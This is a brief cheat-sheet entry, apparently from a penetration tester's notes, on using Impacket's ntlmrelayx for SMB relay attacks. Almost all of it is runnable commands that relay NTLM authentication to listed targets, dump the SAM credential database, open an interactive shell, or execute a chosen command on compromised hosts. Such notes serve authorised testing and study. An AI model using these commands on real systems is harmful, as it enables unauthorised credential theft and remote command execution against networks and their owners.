-- -
Used for various exploits with SMB relay. 
#### Basic Usage
```bash
# Depending on you install, you may run these differently
# 1. impacket-ntlmrelayx
# 2. ntlmrelayx.py

# Performs attack, tells you what is successful and dumps the SAM
impacket-ntlmrelayx -tf <target file> -smb2support
impacket-ntlmrelayx -tf relay_targets -smb2support

# supposedly give you interactive shell
impacket-ntlmrelayx -tf relay_targets -smb2support -i

# run single command
impacket-ntlmrelayx -tf relay_targets -smb2support -c "whoami"
```

^b5239c
